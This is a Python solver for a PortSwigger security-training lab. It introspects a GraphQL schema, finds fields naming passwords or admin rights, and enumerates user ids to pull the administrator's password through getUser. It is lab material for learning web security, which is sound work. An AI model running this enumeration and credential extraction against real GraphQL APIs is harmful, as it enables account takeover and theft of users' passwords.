"""
Lab 2: Accidental exposure of private GraphQL fields
https://portswigger.net/web-security/graphql/lab-graphql-field-exposure
Difficulty: Practitioner

📝 Introspection reveals the full schema, including fields the UI never
actually requests (e.g. a password field on the User type, or an
isAdmin-style mutation argument). Use that knowledge to log in as
administrator and delete carlos.
"""

from utils import get_session, graphql_query, try_introspection, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
ENDPOINT = f"{TARGET}/graphql/v1"


def run():
    s = get_session()

    note("Step 1: introspect the schema to find fields/mutations the UI")
    note("doesn't surface.")
    schema = try_introspection(s, ENDPOINT)
    if not schema:
        return

    types = schema["data"]["__schema"]["types"]
    for t in types:
        if t.get("fields"):
            field_names = [f["name"] for f in t["fields"]]
            if any("pass" in n.lower() or "admin" in n.lower() for n in field_names):
                log(f"Type {t['name']!r} has interesting fields: {field_names}")

    note("Step 2: once you've identified the right type/query (commonly")
    note("getUser(id) returning a 'password' field), query it directly for")
    note("the administrator account.")

    query = """
    query getUser($id: Int!) {
      getUser(id: $id) {
        id
        username
        password
      }
    }
    """
    for uid in range(0, 5):
        r, data = graphql_query(s, ENDPOINT, query, variables={"id": uid})
        user = data.get("data", {}).get("getUser") if data else None
        if user:
            log(f"id={uid}: {user}")
            if user.get("username", "").lower() == "administrator":
                log(f"Got administrator password: {user.get('password')}")
                return


if __name__ == "__main__":
    run()
